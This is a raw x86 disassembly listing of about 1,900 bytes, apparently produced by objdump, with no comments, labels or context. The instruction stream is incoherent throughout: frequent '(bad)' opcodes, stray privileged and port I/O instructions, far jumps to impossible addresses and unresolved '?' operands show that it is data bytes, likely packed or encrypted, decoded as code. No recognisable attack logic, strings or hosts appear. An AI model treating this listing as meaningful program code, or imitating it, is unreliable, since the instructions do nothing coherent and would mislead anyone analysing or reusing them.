  41d1e2:	mov    eax,0xea681b2
  41d1e7:	pop    ebp
  41d1e8:	jo     0x41d19d
  41d1ea:	cmp    al,0x31
  41d1ec:	xor    BYTE PTR [edx+0x2ac50000],0x11
  41d1f3:	fimul  DWORD PTR [ecx]
  41d1f5:	inc    ebp
  41d1f6:	sub    DWORD PTR [ecx+0x108836],0x0
  41d1fd:	(bad)  
  41d1fe:	test   DWORD PTR [ebp-0x6fc8a4ec],0xc9c5696d
  41d208:	jae    0x41d1ce
  41d20a:	cmp    eax,DWORD PTR [eax]
  41d20c:	add    bl,bl
  41d20e:	add    al,0xc0
  41d210:	add    BYTE PTR [eax],al
  41d212:	lock xor BYTE PTR [eax-0x2af6ca4d],dl
  41d219:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d21a:	dec    esp
  41d21b:	push   ebx
  41d21c:	add    BYTE PTR [eax],al
  41d21e:	sahf   
  41d21f:	mov    ds:0xef38e399,al
  41d224:	mov    eax,0x6479ffa2
  41d229:	pop    ss
  41d22a:	call   0x6109496a
  41d22f:	inc    ebp
  41d230:	jmp    0xc2d0220b
  41d235:	xor    al,0x98
  41d237:	jb     0x41d1ca
  41d239:	jl     0x41d220
  41d23b:	push   ss
  41d23c:	rol    DWORD PTR [edx+0x197f9247],0xe7
  41d243:	push   esi
  41d244:	inc    edi
  41d245:	pusha  
  41d246:	push   0xf9f03aac
  41d24b:	cli    
  41d24c:	xchg   esp,eax
  41d24d:	sti    
  41d24e:	sub    eax,0xdfbf05f5
  41d253:	out    0x8b,eax
  41d255:	jmp    FWORD PTR [eax]
  41d257:	xchg   esi,eax
  41d258:	mov    ch,0x5e
  41d25a:	mov    ecx,0xdd80eb35
  41d25f:	add    BYTE PTR [eax],al
  41d261:	lock ret 0x92d9
  41d265:	es clc 
  41d267:	xchg   edi,eax
  41d268:	xchg   edi,eax
  41d269:	scas   al,BYTE PTR es:[edi]
  41d26a:	xor    al,ch
  41d26c:	or     ch,BYTE PTR [ecx+0x67]
  41d26f:	ins    DWORD PTR es:[edi],dx
  41d270:	and    eax,0x718498
  41d275:	add    BYTE PTR [ecx],bl
  41d277:	pop    ebp
  41d278:	add    edi,ebp
  41d27a:	out    dx,al
  41d27b:	jp     0x41d2f8
  41d27d:	lea    ebp,[ecx+0x15]
  41d280:	nop
  41d281:	loopne 0x41d22b
  41d283:	mov    BYTE PTR ss:[edx-0x2dba0000],dl
  41d28a:	imul   edi,DWORD PTR [edi-0x637cb8e2],0xf9c8ef
  41d294:	add    BYTE PTR [edx+0x6c0fefaa],ch
  41d29a:	dec    eax
  41d29b:	imul   eax,DWORD PTR [eax],0x0
  41d29e:	cmp    cl,BYTE PTR [esi+0x52]
  41d2a1:	xlat   BYTE PTR ds:[ebx]
  41d2a2:	les    edx,FWORD PTR [esi+0x0]
  41d2a5:	add    BYTE PTR [esi+edi*2+0x0],al
  41d2a9:	add    bh,ah
  41d2ab:	push   es
  41d2ac:	es mov ebx,0xd7d6a324
  41d2b2:	pusha  
  41d2b3:	sbb    al,0x4b
  41d2b5:	aam    0xf4
  41d2b7:	test   DWORD PTR [ebx],0x87334b8
  41d2bd:	mov    edi,0x89250000
  41d2c2:	out    dx,eax
  41d2c3:	(bad)  
  41d2c4:	or     dl,BYTE PTR [eax+eiz*2]
  41d2c7:	nop
  41d2c8:	jle    0x41d2dc
  41d2ca:	lds    edi,FWORD PTR [esi+ebx*4]
  41d2cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d2ce:	jle    0x41d2fc
  41d2d0:	sbb    eax,0x5c9156fc
  41d2d5:	dec    ecx
  41d2d6:	jmp    0x41d2d1
  41d2d8:	xor    BYTE PTR [eax-0x1b6011e6],bl
  41d2de:	test   eax,0x2580ce9b
  41d2e3:	add    BYTE PTR [eax],al
  41d2e5:	mov    eax,ds:0xbf875916
  41d2ea:	add    ah,bl
  41d2ec:	add    BYTE PTR [eax],al
  41d2ee:	icebp  
  41d2ef:	pop    ecx
  41d2f0:	cdq    
  41d2f1:	mov    ds:0xa33ce863,al
  41d2f6:	shr    BYTE PTR [ebp+0x0],0x0
  41d2fa:	inc    eax
  41d2fb:	mov    esp,0x60340000
  41d300:	xor    DWORD PTR [ecx],ebx
  41d302:	inc    ecx
  41d303:	jbe    0x41d2b2
  41d305:	aas    
  41d306:	or     eax,0x5642b996
  41d30b:	xor    eax,0xe272a573
  41d310:	xchg   esp,eax
  41d311:	ror    BYTE PTR [ebx-0x7cf30000],0x2b
  41d318:	nop
  41d319:	push   edx
  41d31a:	je     0x41d2e6
  41d31c:	gs mov edi,ebp
  41d31f:	sbb    ch,BYTE PTR [edx]
  41d321:	sbb    ch,BYTE PTR [ebx]
  41d323:	lods   al,BYTE PTR ds:[esi]
  41d324:	(bad)  
  41d325:	imul   ebp,esp,0xffffff95
  41d328:	or     DWORD PTR [edi+0x0],0xffffffd5
  41d32c:	add    BYTE PTR [eax],al
  41d32e:	cld    
  41d32f:	and    eax,0xa33a6779
  41d334:	jnp    0x41d303
  41d336:	das    
  41d337:	mov    eax,0x165f365a
  41d33c:	imul   ebp,DWORD PTR [esi],0x300fd213
  41d342:	add    eax,0xee2bd72b
  41d347:	jmp    0xf44e4176
  41d34c:	add    BYTE PTR [eax],al
  41d34e:	loopne 0x41d2fe
  41d350:	es or  al,0x14
  41d353:	add    BYTE PTR [eax],al
  41d355:	mov    dh,ch
  41d357:	add    BYTE PTR [eax],al
  41d359:	mov    edi,0x5f9446ec
  41d35e:	fild   WORD PTR ds:0x20dcada9
  41d364:	push   eax
  41d365:	jno    0x41d373
  41d367:	sbb    al,BYTE PTR [eax]
  41d369:	add    BYTE PTR [esi],ch
  41d36b:	mov    cl,0x11
  41d36d:	leave  
  41d36e:	jl     0x41d3c4
  41d370:	ret    0x54d
  41d373:	push   es
  41d374:	jnp    0x41d368
  41d376:	(bad)  [eax]
  41d378:	sbb    bl,BYTE PTR [eax-0x1a]
  41d37b:	push   edi
  41d37c:	and    DWORD PTR [edx],ebp
  41d37e:	xor    DWORD PTR [esi+0xae8436],eax
  41d384:	add    BYTE PTR [edx],ch
  41d386:	in     al,0xfb
  41d388:	jg     0x41d3cb
  41d38a:	xchg   edi,eax
  41d38b:	aad    0xca
  41d38d:	jo     0x41d3f5
  41d38f:	cmp    ch,BYTE PTR [esi*8-0x5b7e3281]
  41d396:	add    eax,0x659fe316
  41d39b:	loope  0x41d34c
  41d39d:	jmp    0x41d372
  41d39f:	push   esp
  41d3a0:	cmp    al,0x9d
  41d3a2:	pop    esi
  41d3a3:	repnz mov ah,0x52
  41d3a6:	sub    eax,0x4e861e4a
  41d3ab:	jl     0x41d417
  41d3ad:	ja     0x41d35c
  41d3af:	or     dl,BYTE PTR [ecx]
  41d3b1:	(bad)  
  41d3b2:	lahf   
  41d3b3:	cmp    eax,0x51dc701
  41d3b8:	test   al,0x8
  41d3ba:	inc    ecx
  41d3bb:	add    BYTE PTR [eax],al
  41d3bd:	sbb    ecx,DWORD PTR [ebp-0x6332e1e5]
  41d3c3:	lahf   
  41d3c4:	or     edx,DWORD PTR [edi-0x39]
  41d3c7:	dec    esi
  41d3c8:	je     0x41d370
  41d3ca:	add    eax,0x28985c1e
  41d3cf:	cdq    
  41d3d0:	or     edx,ebp
  41d3d2:	dec    edi
  41d3d3:	jg     0x41d3c6
  41d3d5:	jo     0x41d363
  41d3d7:	imul   eax,DWORD PTR [eax],0xfa881f00
  41d3dd:	add    BYTE PTR [eax],al
  41d3df:	adc    al,0x7f
  41d3e1:	mov    cl,0x13
  41d3e3:	sub    dh,BYTE PTR [ecx]
  41d3e5:	int    0xfb
  41d3e7:	or     eax,0xd8c8
  41d3ec:	leave  
  41d3ed:	imul   DWORD PTR [edi+0x7c]
  41d3f0:	mov    WORD PTR [edx+0x1a5a0000],fs
  41d3f6:	or     al,0x22
  41d3f8:	add    BYTE PTR [eax],al
  41d3fa:	hlt    
  41d3fb:	mov    esp,DWORD PTR [edx+0x3d]
  41d3fe:	pop    ss
  41d3ff:	arpl   bx,di
  41d401:	test   DWORD PTR [esi+0x33],0xecd9f8b6
  41d408:	xchg   edx,eax
  41d409:	add    al,0xe5
  41d40b:	add    BYTE PTR [eax],al
  41d40d:	fs popa 
  41d40f:	xor    DWORD PTR [ecx-0x18],0xffffffb2
  41d413:	pusha  
  41d414:	sub    eax,0x4e1e7ce1
  41d419:	jo     0x41d450
  41d41b:	sbb    cl,al
  41d41d:	mov    al,ds:0xf1ffe94b
  41d422:	push   es
  41d423:	mov    dh,0xf8
  41d425:	repz or eax,0x31152b51
  41d42b:	(bad)  
  41d42c:	pop    ss
  41d42d:	das    
  41d42e:	jne    0x41d4a9
  41d430:	sbb    DWORD PTR [ebx],eax
  41d432:	xlat   BYTE PTR ds:[ebx]
  41d433:	push   es
  41d434:	inc    edi
  41d435:	jns    0x41d3e9
  41d437:	test   al,0x72
  41d439:	popa   
  41d43a:	jmp    0x2ec4:0x8a70d0f4
  41d441:	add    BYTE PTR [eax],al
  41d443:	arpl   WORD PTR [eax-0x77],bp
  41d446:	cmp    DWORD PTR [ecx+0x1e],esi
  41d449:	test   BYTE PTR [eax+eax*1+0x0],al
  41d44d:	cwde   
  41d44e:	mov    ch,0xc
  41d450:	ret    0x0
  41d453:	jl     0x41d479
  41d455:	int    0x44
  41d457:	pop    ecx
  41d458:	add    BYTE PTR [eax],al
  41d45a:	mov    eax,ds:0x9471a2bf
  41d45f:	jle    0x41d43e
  41d461:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d462:	sti    
  41d463:	int    0x46
  41d465:	call   0xcd20:0xae6d8da3
  41d46c:	repnz sbb dh,BYTE PTR [edx+ebx*8-0x30]
  41d471:	es out 0xd7,eax
  41d474:	icebp  
  41d475:	xor    edx,edx
  41d477:	(bad)  
  41d478:	cmp    esi,DWORD PTR [edi+0x38]
  41d47b:	push   es
  41d47c:	jb     0x41d48a
  41d47e:	add    al,0x0
  41d480:	add    BYTE PTR [edi-0x2a7af615],ah
  41d486:	test   DWORD PTR [ecx+0x1b],0xff025395
  41d48d:	mov    esi,0xcfb56724
  41d492:	sub    DWORD PTR [eax+0x388ae67d],esi
  41d498:	int    0x32
  41d49a:	lods   al,BYTE PTR ds:[esi]
  41d49b:	mov    ah,0x63
  41d49d:	leave  
  41d49e:	dec    ebp
  41d49f:	frstor [ecx+0x2eaf58f2]
  41d4a5:	xlat   BYTE PTR ds:[ebx]
  41d4a6:	cmc    
  41d4a7:	mov    bh,BYTE PTR [esp+esi*8-0x12cc9e7]
  41d4ae:	sub    edi,edi
  41d4b0:	(bad)  
  41d4b1:	pop    esp
  41d4b2:	in     eax,0xc8
  41d4b4:	out    dx,eax
  41d4b5:	add    BYTE PTR [eax],al
  41d4b7:	xchg   esi,eax
  41d4b8:	(bad)  
  41d4b9:	enter  0x31,0x0
  41d4bd:	ret    0xb44
  41d4c0:	add    BYTE PTR [eax],al
  41d4c2:	lods   al,BYTE PTR ds:[esi]
  41d4c3:	sar    eax,1
  41d4c5:	lds    edi,FWORD PTR [ebx+0x41]
  41d4c8:	imul   eax,DWORD PTR [edx-0x265513ac],0x2
  41d4cf:	push   cs
  41d4d0:	xchg   esp,eax
  41d4d1:	push   esi
  41d4d2:	ins    BYTE PTR es:[edi],dx
  41d4d3:	jo     0x41d52d
  41d4d5:	and    edx,ebp
  41d4d7:	xor    edi,DWORD PTR ds:0x64e8aed0
  41d4dd:	inc    ebp
  41d4de:	jl     0x41d536
  41d4e0:	adc    al,0x36
  41d4e2:	imul   edi,esp,0xffffffd1
  41d4e5:	mov    ds:0xa70c,al
  41d4eb:	lods   eax,DWORD PTR ds:[esi]
  41d4ec:	std    
  41d4ed:	dec    ecx
  41d4ee:	or     ebx,ebx
  41d4f0:	push   cs
  41d4f1:	idiv   bh
  41d4f3:	pop    ecx
  41d4f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d4f5:	add    al,0x73
  41d4f7:	add    BYTE PTR [eax],al
  41d4f9:	sub    al,0x30
  41d4fb:	pop    es
  41d4fc:	scas   al,BYTE PTR es:[edi]
  41d4fd:	add    eax,esi
  41d4ff:	adc    BYTE PTR [ebx-0x69fbc11f],dh
  41d505:	add    BYTE PTR [eax],al
  41d507:	adc    eax,DWORD PTR [esi]
  41d509:	jge    0x41d589
  41d50b:	adc    dl,BYTE PTR [edi+edx*4+0xe752e31]
  41d512:	je     0x41d541
  41d514:	leave  
  41d515:	or     edx,edi
  41d517:	gs mov dl,0x1e
  41d51a:	(bad)  
  41d51b:	mov    eax,0x5908
  41d520:	lds    edx,FWORD PTR [ebx-0x6be4ddcc]
  41d526:	sar    BYTE PTR [edi+0xc31a091],cl
  41d52c:	cmc    
  41d52d:	add    BYTE PTR [eax],al
  41d52f:	hlt    
  41d530:	pop    edi
  41d531:	dec    edi
  41d532:	cmp    ebx,DWORD PTR [edx]
  41d534:	addr16 pop ebx
  41d536:	mov    ?,ebx
  41d538:	leave  
  41d539:	jg     0x41d516
  41d53b:	adc    edx,DWORD PTR [eax]
  41d53d:	and    bl,BYTE PTR [ecx+0x6a4b7228]
  41d543:	imul   esi,DWORD PTR [ebx],0xef75bd68
  41d549:	std    
  41d54a:	lea    edi,[esp+eiz*2+0x3440e98a]
  41d551:	add    BYTE PTR [eax],al
  41d553:	mov    ds:0x873d5956,eax
  41d558:	pop    edx
  41d559:	sub    edi,esp
  41d55b:	xchg   ah,bl
  41d55d:	add    eax,0x9fa5e0a7
  41d562:	jmp    0x41d54b
  41d564:	imul   ecx,DWORD PTR [esi+ecx*4],0x0
  41d568:	add    BYTE PTR [eax],al
  41d56a:	out    dx,eax
  41d56b:	add    BYTE PTR [eax],al
  41d56d:	add    cl,BYTE PTR [esi]
  41d56f:	or     ebp,DWORD PTR [ecx-0x33]
  41d572:	push   0x4e851b6c
  41d577:	cs mov ebx,0xb6607db6
  41d57d:	fist   DWORD PTR [esp+ebp*2-0x62]
  41d581:	paddsw mm4,QWORD PTR [edi+0x66bf63f]
  41d588:	fs xor bl,0x96
  41d58c:	fstp   TBYTE PTR [edx]
  41d58e:	iret   
  41d58f:	cmp    bh,BYTE PTR [eax+eiz*1+0x3a44]
  41d596:	jnp    0x41d58b
  41d598:	mov    bl,dh
  41d59a:	add    BYTE PTR [eax],al
  41d59c:	inc    ecx
  41d59d:	stc    
  41d59e:	imul   eax,DWORD PTR [ebx+ebp*4+0x0],0x80bf6b00
  41d5a6:	mov    eax,0x91eb0000
  41d5ab:	xor    esp,DWORD PTR [ebx]
  41d5ad:	sbb    al,0x22
  41d5af:	adc    eax,0x4d8059
  41d5b4:	add    BYTE PTR [eax],ah
  41d5b6:	adc    al,0x5f
  41d5b8:	pop    ebx
  41d5b9:	out    0x7a,eax
  41d5bb:	mov    bh,bl
  41d5bd:	add    BYTE PTR [eax],al
  41d5bf:	add    edx,DWORD PTR [ecx-0x2a1d1a83]
  41d5c5:	fs iret 
  41d5c7:	jg     0x41d573
  41d5c9:	push   ebx
  41d5ca:	cwde   
  41d5cb:	adc    ecx,esi
  41d5cd:	mov    eax,ds:0xe431464a
  41d5d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5d3:	push   0xffffffa5
  41d5d5:	enter  0x2f,0x0
  41d5d9:	out    dx,eax
  41d5da:	push   ss
  41d5db:	add    BYTE PTR [edi],al
  41d5dd:	add    BYTE PTR [eax],al
  41d5df:	mov    ebp,0xc2151ffd
  41d5e4:	cli    
  41d5e5:	and    eax,0xf8f67461
  41d5ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d5eb:	adc    eax,0x993eac89
  41d5f0:	push   edi
  41d5f1:	in     eax,dx
  41d5f2:	inc    esi
  41d5f3:	inc    eax
  41d5f4:	jmp    0x41d5f6
  41d5f6:	add    dh,cl
  41d5f8:	fbld   TBYTE PTR [eax]
  41d5fa:	not    BYTE PTR cs:[esi-0x57e2baa5]
  41d601:	cld    
  41d602:	mov    bl,bl
  41d604:	add    BYTE PTR [eax],al
  41d606:	lods   eax,DWORD PTR ds:[esi]
  41d607:	test   al,0x7f
  41d609:	push   ecx
  41d60a:	fadd   QWORD PTR [ebp-0x5549cf49]
  41d610:	test   al,0x86
  41d612:	mov    BYTE PTR [ecx],cl
  41d614:	add    BYTE PTR [eax],al
  41d616:	mov    esi,0xaa32e8dc
  41d61b:	pop    ecx
  41d61c:	adc    DWORD PTR [eax+edi*8],0x67
  41d620:	stc    
  41d621:	stc    
  41d622:	fstp   st(0)
  41d624:	jo     0x41d5b5
  41d626:	and    edx,ecx
  41d628:	(bad)  
  41d629:	fisub  WORD PTR [ebx+0x6002e]
  41d62f:	add    BYTE PTR [edi+0x1469e46d],ch
  41d635:	xor    DWORD PTR [ebx+0x2f6807e7],ecx
  41d63b:	xor    eax,0x530c17
  41d640:	add    BYTE PTR [esi],dh
  41d642:	xor    dl,BYTE PTR [edx+0x2d]
  41d645:	repnz pop es
  41d647:	xchg   esp,eax
  41d648:	or     edx,DWORD PTR [ecx+ecx*4]
  41d64b:	cmp    ah,BYTE PTR [edx]
  41d64d:	mov    dh,0x80
  41d64f:	adc    DWORD PTR [eax],eax
  41d651:	add    BYTE PTR [edx+0x4f],dl
  41d654:	sbb    bl,BYTE PTR [esi]
  41d656:	push   edi
  41d657:	fld    QWORD PTR [ebx-0x27]
  41d65a:	add    dl,BYTE PTR [ecx-0x52c4874a]
  41d660:	je     0x41d63c
  41d662:	test   BYTE PTR [ecx+0xfcc],0x26
  41d669:	sbb    eax,0x5ec8fa6f
  41d66e:	add    BYTE PTR [eax],al
  41d670:	mov    cl,0x26
  41d672:	sub    BYTE PTR [edi+ecx*2+0x2204b4b1],bh
  41d679:	add    BYTE PTR [eax],al
  41d67b:	xchg   edx,eax
  41d67c:	call   FWORD PTR [edi+0xd]
  41d67f:	dec    edx
  41d680:	cmp    al,dh
  41d682:	stc    
  41d683:	xchg   ebx,eax
  41d684:	arpl   WORD PTR [ebx],si
  41d686:	add    esi,DWORD PTR [edx+0x5]
  41d689:	mov    eax,0x48fd5e7
  41d68e:	mov    dh,0x0
  41d690:	add    BYTE PTR [ebp-0xdda61da],ch
  41d696:	fsub   DWORD PTR [ebx-0x5aa36a10]
  41d69c:	or     eax,0xdecfbe12
  41d6a1:	sbb    DWORD PTR [ebp-0x53cec40f],0x7d8c
  41d6ab:	aad    0x97
  41d6ad:	xor    eax,0x1aa74dee
  41d6b2:	pop    ss
  41d6b3:	add    al,0x27
  41d6b5:	add    BYTE PTR [eax],al
  41d6b7:	mov    eax,0xffec691e
  41d6bc:	pop    ebp
  41d6bd:	sbb    eax,0x712876f
  41d6c2:	dec    edx
  41d6c3:	es out dx,eax
  41d6c5:	lds    ebp,FWORD PTR [bp+di-0x5cd3]
  41d6ca:	in     al,dx
  41d6cb:	aaa    
  41d6cc:	out    0x23,eax
  41d6ce:	jle    0x41d6b5
  41d6d0:	cdq    
  41d6d1:	mov    eax,0x6b364f66
  41d6d6:	loope  0x41d74f
  41d6d8:	mov    ds:0x262896cd,eax
  41d6dd:	lods   al,BYTE PTR ds:[esi]
  41d6de:	push   0xf3ca3356
  41d6e3:	loopne 0x41d671
  41d6e5:	jo     0x41d6e7
  41d6e7:	add    al,bh
  41d6e9:	and    al,0x8f
  41d6eb:	add    DWORD PTR [ecx-0x48],eax
  41d6ee:	mov    ds:0x5754ebc6,al
  41d6f3:	or     DWORD PTR [esi],ebx
  41d6f5:	sti    
  41d6f6:	fdiv   DWORD PTR [edx+0xf]
  41d6f9:	(bad)  
  41d6fa:	cmp    DWORD PTR [esi-0x4b],ebx
  41d6fd:	sub    BYTE PTR [edi-0x31028233],dl
  41d703:	cmp    DWORD PTR [ebp+0x27410a41],edi
  41d709:	push   edi
  41d70a:	inc    ebp
  41d70b:	sbb    bl,BYTE PTR [edi-0x64]
  41d70e:	and    ah,dh
  41d710:	push   esp
  41d711:	sub    dh,BYTE PTR cs:[ecx]
  41d714:	into   
  41d715:	repz out dx,al
  41d717:	xlat   BYTE PTR ss:[ebx]
  41d719:	adc    eax,0xd14f6e35
  41d71e:	(bad)  
  41d71f:	jae    0x41d77d
  41d721:	(bad)  
  41d722:	cmc    
  41d723:	ins    BYTE PTR es:[edi],dx
  41d724:	push   ebp
  41d725:	mov    al,ds:0x1fc47c
  41d72a:	add    BYTE PTR [edx],al
  41d72c:	loopne 0x41d704
  41d72e:	dec    esi
  41d72f:	fsub   DWORD PTR [edx-0x58df5777]
  41d735:	mov    dl,BYTE PTR [esi-0x76514c5d]
  41d73b:	or     ebx,esp
  41d73d:	scas   eax,DWORD PTR es:[edi]
  41d73e:	xchg   esp,eax
  41d73f:	rcr    BYTE PTR [edx-0x11],1
  41d742:	scas   al,BYTE PTR es:[edi]
  41d743:	sub    DWORD PTR [ebp-0x23],ebp
  41d746:	inc    ecx
  41d747:	push   edi
  41d748:	iret   
  41d749:	enter  0xae,0x0
  41d74d:	dec    ebp
  41d74e:	or     eax,DWORD PTR [esi+0x7f4155f9]
  41d754:	xchg   DWORD PTR [eax],esi
  41d756:	jnp    0x41d6f6
  41d758:	pop    ds
  41d759:	dec    BYTE PTR [ecx+0x7e43ef79]
  41d75f:	leave  
  41d760:	and    al,ch
  41d762:	inc    ebp
  41d763:	or     al,0x11
  41d765:	add    BYTE PTR [eax],al
  41d767:	retf   0x1a36
  41d76a:	jp     0x41d74a
  41d76c:	iret   
  41d76d:	sub    BYTE PTR [edx],0x0
  41d770:	add    BYTE PTR [edi-0x78],bh
  41d773:	add    al,0x0
  41d775:	add    BYTE PTR [ecx+0x2e18ba99],ah
  41d77b:	mov    esp,0x24f58793
  41d780:	add    BYTE PTR [ecx],bl
  41d782:	add    BYTE PTR [eax],al
  41d784:	int3   
  41d785:	rol    DWORD PTR [eax],cl
  41d787:	add    cl,dl
  41d789:	popf   
  41d78a:	(bad)  
  41d78b:	mov    WORD PTR [edx+0x68170000],?
  41d791:	in     al,dx
  41d792:	and    al,0xad
  41d794:	aas    
  41d795:	xor    DWORD PTR [ecx],edx
  41d797:	mov    eax,ds:0xf4655392
  41d79c:	jne    0x41d7fa
  41d79e:	(bad)  
  41d79f:	mov    esi,0x70f3e215
  41d7a4:	(bad)  
  41d7a5:	nop
  41d7a6:	fstp   st(7)
  41d7a8:	sahf   
  41d7a9:	shr    DWORD PTR [eax+eiz*1-0x11],cl
  41d7ad:	dec    ebx
  41d7ae:	(bad)  [ebx-0x67a2a02d]
  41d7b4:	cmp    edi,DWORD PTR [eax-0x56]
  41d7b7:	inc    esi
  41d7b8:	sub    dh,BYTE PTR [ebp-0x68c400f6]
  41d7be:	jae    0x41d795
  41d7c0:	fs neg dh
  41d7c3:	add    ebp,DWORD PTR [eax]
  41d7c5:	sub    DWORD PTR [edi],edx
  41d7c7:	push   ecx
  41d7c8:	enter  0x13,0x0
  41d7cc:	or     BYTE PTR [esi+0x69e10000],0xc6
  41d7d3:	repnz out 0xe4,eax
  41d7d6:	jmp    0x41d82b
  41d7d8:	dec    ebp
  41d7d9:	(bad)  
  41d7da:	cmp    ch,BYTE PTR [edx]
  41d7dc:	xchg   esi,eax
  41d7dd:	in     eax,0xc7
  41d7df:	fldenv [edx+ecx*8-0x49e84844]
  41d7e6:	out    0x4b,eax
  41d7e8:	jo     0x41d7a9
  41d7ea:	adc    eax,0x6a10e66f
  41d7ef:	pop    ds
  41d7f0:	retf   0x5d81
  41d7f3:	neg    BYTE PTR [ebx]
  41d7f5:	mov    ebx,ss
  41d7f7:	add    BYTE PTR [eax],al
  41d7f9:	retf   0xf026
  41d7fc:	cmp    ch,BYTE PTR [ecx+0xb404]
  41d802:	adc    ch,BYTE PTR [ebp+0x2f9f8e10]
  41d808:	fst    QWORD PTR [eax-0x5f]
  41d80b:	bound  edi,QWORD PTR [ecx-0x65]
  41d80e:	or     edi,DWORD PTR [ebp+0x4dcf207d]
  41d814:	out    dx,eax
  41d815:	inc    eax
  41d816:	mov    bh,0x0
  41d818:	add    BYTE PTR [edx],dh
  41d81a:	adc    ebx,DWORD PTR [edi+0xb0cc76]
  41d820:	add    BYTE PTR [esi-0x62],dl
  41d823:	sbb    edi,eax
  41d825:	imul   ebx,DWORD PTR [ebx+0x170432],0x0
  41d82c:	fcomp  QWORD PTR [edx+0x762e2867]
  41d832:	cwde   
  41d833:	dec    ecx
  41d834:	es inc edi
  41d836:	retf   0x72ae
  41d839:	jne    0x41d7c6
  41d83b:	out    0x66,al
  41d83d:	dec    eax
  41d83e:	dec    edx
  41d83f:	add    BYTE PTR [eax],al
  41d841:	int    0xfe
  41d843:	not    DWORD PTR [edi+0x1b]
  41d846:	in     eax,dx
  41d847:	mov    dh,0xf4
  41d849:	jbe    0x41d818
  41d84b:	jae    0x41d8c1
  41d84d:	or     edi,DWORD PTR [esi-0x9]
  41d850:	xchg   ebx,eax
  41d851:	or     edi,DWORD PTR [edi]
  41d853:	mov    ah,0x26
  41d855:	ds pop ebx
  41d857:	adc    eax,0xcd2eb5a0
  41d85c:	call   0xee250ef1
  41d861:	or     BYTE PTR [edx],ch
  41d863:	add    BYTE PTR [eax],al
  41d865:	inc    edx
  41d866:	mov    esi,0xcfb9e356
  41d86b:	shl    BYTE PTR [ebp-0x7d8a0000],0x77
  41d872:	pop    esp
  41d873:	cmp    esi,eax
  41d875:	fcomi  st,st(1)
  41d877:	xor    DWORD PTR [edi],esi
  41d879:	hlt    
  41d87a:	xchg   ecx,eax
  41d87b:	sub    eax,DWORD PTR [esi-0x6d]
  41d87e:	sbb    BYTE PTR [ebx+ebp*2-0x4c870000],al
  41d885:	out    dx,eax
  41d886:	and    al,ch
  41d888:	and    cl,dh
  41d88a:	pop    edx
  41d88b:	lahf   
  41d88c:	cmp    BYTE PTR [esi-0x19],ch
  41d88f:	push   esp
  41d890:	lfs    ebp,FWORD PTR [edi+0x13]
  41d894:	mov    esp,0x5348
  41d899:	jecxz  0x41d907
  41d89b:	int3   
  41d89c:	mov    eax,0x62d00000
  41d8a1:	pop    ss
  41d8a2:	jmp    ebx
  41d8a4:	xchg   ebp,ebx
  41d8a6:	outs   dx,BYTE PTR ds:[esi]
  41d8a7:	xchg   esp,eax
  41d8a8:	hlt    
  41d8a9:	push   esi
  41d8aa:	stos   DWORD PTR es:[edi],eax
  41d8ab:	xchg   BYTE PTR [edi-0x4531077f],ah
  41d8b1:	fsub   DWORD PTR [edx+0x21]
  41d8b4:	mov    DWORD PTR [ecx+eiz*8-0x548b9097],edx
  41d8bb:	xchg   esi,eax
  41d8bc:	fisubr WORD PTR [ebx-0x6f1680a0]
  41d8c2:	imul   eax,DWORD PTR [ecx+0x50538932],0xffffffaa
  41d8c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8ca:	jo     0x41d930
  41d8cc:	out    0x6e,al
  41d8ce:	aaa    
  41d8cf:	std    
  41d8d0:	cli    
  41d8d1:	fild   QWORD PTR [ebx+0x2e]
  41d8d4:	inc    edi
  41d8d5:	fild   DWORD PTR [ebx-0x50]
  41d8d8:	data16 (bad) 
  41d8da:	sub    eax,0x6268151e
  41d8df:	test   BYTE PTR [ebp+0x0],bl
  41d8e2:	add    ah,al
  41d8e4:	aam    0x0
  41d8e6:	add    dl,ah
  41d8e8:	ss cdq 
  41d8ea:	or     al,0xf
  41d8ec:	add    BYTE PTR [eax],al
  41d8ee:	outs   dx,DWORD PTR ds:[esi]
  41d8ef:	lods   al,BYTE PTR ds:[esi]
  41d8f0:	data16 add BYTE PTR [ebp+0x0],dl
  41d8f4:	add    BYTE PTR [esi],cl
  41d8f6:	inc    ebp
  41d8f7:	and    BYTE PTR [eax-0x32],bh
  41d8fa:	jns    0x41d938
  41d8fc:	xchg   ebx,eax
  41d8fd:	setnp  ah
  41d900:	xor    BYTE PTR [eax],al
  41d902:	add    BYTE PTR [ebx+esi*1+0x0],al
  41d906:	add    BYTE PTR [ebx],bl
  41d908:	pop    es
  41d909:	and    BYTE PTR [esi],dh
  41d90b:	jmp    DWORD PTR [ecx-0x6f]
  41d90e:	cs test eax,0xff40f4
  41d914:	add    BYTE PTR [ebx+0x3dc29bda],cl
  41d91a:	xor    cl,BYTE PTR [esi]
  41d91c:	xchg   ebx,eax
  41d91d:	cmp    eax,0x6288b591
  41d922:	add    BYTE PTR [eax],al
  41d924:	xor    ah,BYTE PTR [eax-0x76d90124]
  41d92a:	push   ebx
  41d92b:	push   0xffffffcf
  41d92d:	jle    0x41d923
  41d92f:	js     0x41d940
  41d931:	fstp   DWORD PTR [ebx+ebp*2+0xd]
  41d935:	(bad)  
  41d936:	aad    0x3a
  41d938:	ror    DWORD PTR [edi-0x13],0x90
  41d93c:	div    BYTE PTR [esi]
  41d93e:	adc    al,0x90
  41d940:	hlt    
  41d941:	inc    edi
  41d942:	outs   dx,BYTE PTR ds:[esi]
  41d943:	aas    
  41d944:	cmc    
  41d945:	jp     0x41d908
  41d947:	add    DWORD PTR [ebp+0xbd014f3],esi
  41d94d:	push   ss
  41d94e:	xchg   DWORD PTR [esi-0x4d5704a],esi
  41d954:	(bad)  
  41d955:	jge    0x41d975
  41d957:	repnz vpsraw ymm3,ymm4,XMMWORD PTR [edi]
  41d95c:	and    ah,BYTE PTR [ebx+0x53]
  41d95f:	sbb    eax,0x80cb7024
  41d964:	sti    
  41d965:	add    BYTE PTR [eax],al
  41d967:	call   0x9b247caa
  41d96c:	xor    BYTE PTR [ebp+0x72],dh
  41d96f:	mov    dl,0x1d
  41d971:	push   0xffffff87
  41d973:	inc    eax
  41d974:	cmp    eax,0x76ae0000
  41d979:	xor    BYTE PTR [ebp+0x49],dh
  41d97c:	add    edx,DWORD PTR [ebx+0x3b]
  41d97f:	jns    0x41d9db
